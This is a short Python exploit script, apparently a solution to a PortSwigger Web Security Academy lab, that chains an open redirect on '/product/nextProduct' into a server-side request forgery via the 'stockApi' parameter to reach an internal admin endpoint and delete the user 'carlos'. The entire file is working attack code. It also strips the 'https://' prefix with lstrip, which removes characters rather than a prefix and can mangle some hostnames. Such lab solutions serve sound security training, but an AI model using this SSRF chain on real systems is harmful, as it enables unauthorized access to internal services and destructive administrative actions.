"""
https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection
"""

import sys
import requests

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

stock_url = f'https://{site}/product/stock'

page = '/product/nextProduct'
parameter = 'path'
delete_url = 'http://192.168.0.12:8080/admin/delete?username=carlos'
open_redir_path = f'{page}?{parameter}={delete_url}'

stockapi_data = {
    'stockApi' : open_redir_path
}
resp = requests.post(stock_url, data=stockapi_data)